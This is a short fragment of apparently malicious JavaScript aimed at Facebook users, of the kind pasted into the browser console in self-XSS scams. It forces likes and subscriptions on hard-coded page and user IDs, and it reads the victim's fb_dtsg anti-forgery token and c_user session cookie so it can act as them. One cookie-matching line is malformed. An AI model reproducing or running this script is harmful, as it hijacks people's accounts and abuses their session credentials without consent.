...
//Toi
a("100002565663778");subist("412100848885434");subist("497659866996198");subist("496053243823527");
Like("218379725037348");Like("255198684651867");Like("603952293015353");Like("203549573175566");

var gid = ['614556715262392'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
